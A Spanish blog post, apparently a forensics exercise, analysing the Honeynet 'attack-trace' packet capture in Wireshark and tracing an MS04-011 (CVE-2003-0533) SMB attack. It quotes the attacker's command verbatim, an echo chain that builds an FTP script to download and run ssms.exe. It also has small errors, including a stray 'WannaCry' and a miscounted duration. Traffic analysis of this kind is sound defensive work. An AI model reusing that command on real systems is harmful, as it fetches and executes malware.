---
layout: post
title: Wireshark - Analizando una captura
categories: Herramienta
---

A continuación se va a plantear una serie de preguntasWannaCry en base a una captura de tráfico de red en formato PCAP, utilizándose Wireshark para responder a estas preguntas, de esta forma se irá viendo cómo obtener la información básica de lo que ocurre en la red en base a una captura del tráfico y la utilización de Wireshark. La captura utilizada puede ser descargada en el siguiente enlace: [https://www3.honeynet.org/wp-content/uploads/attachments/attack-trace.pcap_.gz](https://www3.honeynet.org/wp-content/uploads/attachments/attack-trace.pcap_.gz)

**1. ¿Qué dispositivos (IPs) tenemos? y ¿quién es el atacante y quién el atacado?**

Si vamos a ‘Statics’ -> ‘IPv4 Statistics’ y a ‘All addresses’ podemos ver las IPs que tenemos en esta captura, que son la 192.150.11.111 y la 98.114.205.102.

![Wireshark 01]({{ site.baseurl }}/images/wireshark01.png)

En ‘Statics’ -> ‘Flow Graphs’ podemos ver de forma gráfica el establecimiento de la conexión TCP, y viendo los paquetes SYN y SYN-ACK podemos decir que el atacante es 98.114.205.102 y el atacado 192.150.11.111.

![Wireshark 02]({{ site.baseurl }}/images/wireshark02.png)

**2. ¿Qué puede decir sobre el host atacante? (Por ejemplo, su localización, sistema operativo, etc...)**

Teniendo la IP del host atacante (98.114.205.102) podemos usar diversas herramientas para obtener información.
Con “whois” podemos obtener la organización detrás de la IP (MCI Communications Services, Inc. d/b/a Verizon Business), la dirección (22001 Loudoun County Pkwy, Ashburn, VA 20147, EE. UU. ) y teléfonos, nombres y emails de contacto, entre otra información:

![Wireshark 03]({{ site.baseurl }}/images/wireshark03.png)

En cuanto al Sistema Operativo, podemos obtener esta información mirando los paquetes SMB, para ello usaré los filtros de Wireshark, indicando que el paquete tenga la información del sistema operativo y que la IP de origen del paquete sea la del equipo atacante, es decir, buscaré con el siguiente filtro: “smb.native_os && ip.src == 98.114.205.102”:

![Wireshark 04]({{ site.baseurl }}/images/wireshark04.png)

En ambos paquetes nos devuelve la misma información sobre el sistema operativo, es decir, el sistema operativo es un Windows 2000.
Y en cuanto a la localización podemos usar, por ejemplo, la siguiente herramienta online: [https://check-host.net/ip-info?host=98.114.205.102](https://check-host.net/ip-info?host=98.114.205.102)
Y esta nos devuelve la geolocalización:

![Wireshark 05]({{ site.baseurl }}/images/wireshark05.png)

**3. ¿Cuántas sesiones TCPs ve en la captura?**

Si vamos a ‘Statics’ -> ‘Conversations’ y entramos en la pestaña TCP podemos observar que tenemos 5 sesiones TCPs en todo el proceso que muestra la captura:

![Wireshark 06]({{ site.baseurl }}/images/wireshark06.png)

**4. ¿Cuánto tarda en realizarse el ataque?**

Si analizamos la captura desde Wireshark (en ‘Statics’ -> ‘Capture File properties’) podemos ver que tarda 16 segundos en realizarse:

![Wireshark 07]({{ site.baseurl }}/images/wireshark07.png)

Igualmente en la visualización de los paquetes de Wireshark podemos ver la marca temporal en la columna ‘Time’ indicando como última marca temporal los 16.214214 segundos.

**5. ¿Qué sistema operativo fue el objetivo del ataque?**

Al igual que anteriormente podemos usar los filtros de Wireshark para buscar los paquetes que incluyan la información del sistema operativo y cuya IP de origen sea la máquina del objetivo del ataque, para esto utilizamos los siguientes filtros: “smb.native_os && ip.src == 192.150.11.111”:

![Wireshark 08]({{ site.baseurl }}/images/wireshark08.png)

Como podemos observar, este filtro nos devuelve dos paquetes y en ambos paquetes podemos comprobar que nos indica que el sistema operativo es un Windows 5.1, es decir, un Windows XP.

**6. Resuma las acciones que cree que han sido llevadas a cabo por el atacante (puertos atacados, protocolos involucrados, usuarios, etc..).**

Para ver los puertos que han entrado en juego podemos ir a ‘Statics’ -> ‘IPv4 Statics’ -> ‘Destinations and Ports’, y aquí podemos ver los puertos que han entrado en juego en la máquina atacada:

![Wireshark 09]({{ site.baseurl }}/images/wireshark09.png)

En cuanto a los protocolos involucrados, podemos ir a ‘Statics’ -> ‘Protocol Hierarchy’, y aquí veremos todos los protocolos que aparece en la captura de tráfico y podemos filtrar pulsando el protocolo interesado con el botón derecho y pulsando sobre ‘Apply as Filter’ y ‘Selected’. En la siguiente captura podemos ver los protocolos:

![Wireshark 10]({{ site.baseurl }}/images/wireshark10.png)

Para seguir un orden de los hechos, y habiendo averiguado en las preguntas anteriores el número de sesiones, voy a ir agrupando a través de los filtros los flujos y viendo que se hace en cada uno de ellos. Comenzamos con el tcp.stream == 0:

![Wireshark 11]({{ site.baseurl }}/images/wireshark11.png)

Aquí vemos que se intenta establecer una conexión con el puerto 445. Este puerto es comúnmente utilizado por SMB en Windows desde Windows 2000.
Pasamos al siguiente flujo:

![Wireshark 12]({{ site.baseurl }}/images/wireshark12.png)

Aquí vemos primero que se establece la conexión y que entra en juego el protocolo SMB, con paquetes de “Session Setup”. Vemos que en un momento la víctima responde con un “STATUS_MORE_PROCESSING_REQUIRED”, que significa que está pidiendo credenciales. También podemos ver, en el paquete número 20, la ruta a la que se indica que se conecte. Luego podemos ver que se utiliza el protocolo DCERPC, que es para procedimientos remotos, y se hace uso de DSSETUP que es para obtener información de los “Active Directory”. Y muy importante la información de los paquetes 33 y 38, que nos indica “DsRoleUpgradeDownlevelServer”, y si buscamos esto en Google directamente nos salen diversos exploits para explotar una vulnerabilidad concreta.
Pasamos al análisis del siguiente flujo:

![Wireshark 13]({{ site.baseurl }}/images/wireshark13.png)

Aquí vemos que hay varios paquetes con la ‘flag’ PSH activa, es decir, se le envía cierta información que procedo a revisar. En el paquete número 42, que es el que está seleccionado en la captura de pantalla, se puede ver en la parte inferior que es un comando, procedo a copiar la parte indicada aquí: “echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe”.
Vemos que se pretende subir el fichero ssms.exe haciendo uso de ftp y se le pasa las credenciales para la conexión, pero seguimos con el siguiente flujo.

![Wireshark 14]({{ site.baseurl }}/images/wireshark14.png)

En este flujo lo que podemos observar a través del análisis de los paquetes con la flag ‘PSH’ activa es que se ejecuta de forma correcta el comando descubierto anteriormente. En la captura, por ejemplo, podemos ver que está seleccionado el paquete número 68 y en la parte inferior vemos como se le pasa ‘1’ de password. Anteriormente, de la misma forma, se le pasa también ‘1’ de user. La conexión es satisfactoria, se prepara la subida del fichero y cierra la sesión. Pasamos al siguiente flujo.

![Wireshark 15]({{ site.baseurl }}/images/wireshark15.png)

En este último flujo lo único que vemos es la confirmación de la subida del ejecutable, aquí se sube. En el primer paquete de protocolo ‘Socks’ vemos, en la parte inferior, como se indica “Windows Program”. Con este último flujo podemos confirmar la subida del archivo malicioso.

**7. ¿Qué vulnerabilidad en concreto ha sido atacada? y ¿cree que se trata de un ataque manual o automatizado? Justifique su respuesta.**

Como se pudo ver en el análisis del segundo flujo había dos paquetes que nos informaba de “DsRoleUpgradeDownlevelServer”, y buscando esto en Google obtenemos la vulnerabilidad [CVE-2003-0533](https://nvd.nist.gov/vuln/detail/CVE-2003-0533), vulnerabilidad catalogada por Microsoft como MS04-011 y que si se busca este código en webs como exploit-db se puede encontrar múltiples exploits, algunos para Metasploit.
En cuanto al ataque, creo que es automatizado por el tiempo que tarda en realizarse. Mirando las marcas temporales de los paquetes de Wireshark del último flujo (que es la subida del fichero como se explicó en el punto anterior) podemos observar que va desde el segundo 6.14 hasta el segundo 16.21, es decir, todo el proceso se realiza en 6 segundos.
